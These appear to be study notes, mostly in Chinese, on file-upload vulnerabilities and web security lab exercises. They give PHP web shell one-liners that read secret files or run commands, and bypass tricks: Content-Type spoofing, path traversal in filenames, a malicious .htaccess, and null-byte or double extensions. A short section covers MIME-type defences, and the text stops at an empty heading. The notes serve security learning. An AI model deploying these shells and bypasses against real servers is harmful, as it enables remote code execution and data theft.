## File upload vulnerabilities
- Web Shell  / reverse Shell
- 伺服器配置允許某些類型的文件（例如.php和.jsp)
- 最糟糕的情況是網站允許你上傳伺服器端腳本（例如 PHP、Java 或 Python 檔案）<br>

## PHP 
- "<"?php echo file_get_contents('/path/to/target/file'); ?">"
- "<"?php echo system($_GET['command']); ?">"
- GET /example/exploit.php?command=id HTTP/1.1

**Lab: Remote code execution via web shell upload**
-  圖片上傳功能
- 不會對其進行任何驗證 
- upload exploit.php (<"?php echo file_get_contents('/home/carlos/secret'); ?">)
- GET /files/avatars/exploit.php HTTP/1.1 <br>

## 防禦措施
- 檢查此輸入特定的Content-Type標頭是否與預期的 MIME 類型相符
- Request header:
    - Content-Type:application/x-www-form-url-encoded
    - Content-Type: multipart/form-data
- Content-Type標頭，用於告知伺服器使用此輸入框提交的資料的 MIME 類型
- Content-Disposition標頭，用於提供與其相關的輸入欄位的一些基本資訊
- e.g if 伺服器只接受圖像文件，則可能只允許諸如image/jpeg和 之類的類型image/png
  
**Lab: Web shell upload via Content-Type restriction bypass**
- change Content-Type : image/jpeg

**Lab: Web shell upload via path traversal**
- Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
- filename="..%2fexploit.php"
- GET /files/exploit.php

## 黑名單
- 鮮為人知的替代檔案副檔名 e.g .php5 .shtml
- /etc/apache2/apache2.conf
    - LoadModule php_module /usr/lib/apache2/modules/libphp.so <br>
        AddType application/x-httpd-php .php
- Apache 伺服器 : (.htaccess)
- IIS 伺服器 : (web.config)
    - <"staticContent>
        <"mimeMap fileExtension=".json" mimeType="application/json" /"><br>
        </staticContent">
<br>
**Lab: Web shell upload via extension blacklist bypass**
- filename : .htaccess
- Content-Type : text/plain
- AddType application/x-httpd-php .l33t
- exploit.l33t 

## Obfuscating file extensions
- 多個擴充名 : exploit.php.jpg
- 新增尾隨字元 : exploit.php.
- 使用 URL 編碼 : exploit%2Ephp
- 加上分號 : exploit.asp;.jpg
- 加上URL 編碼的空位元組字元 : exploit.asp%00.jpg
- 使用多位元組 Unicode 字符 : xC0 x2E、xC4 xAE、xC0 xAE會轉換為x2E
- 剝離 : exploit.p.phphp <br>
**Lab: Web shell upload via obfuscated file extension**
- filename="exploit.php%00.jpg"
- exploit.php

## Flawed validation
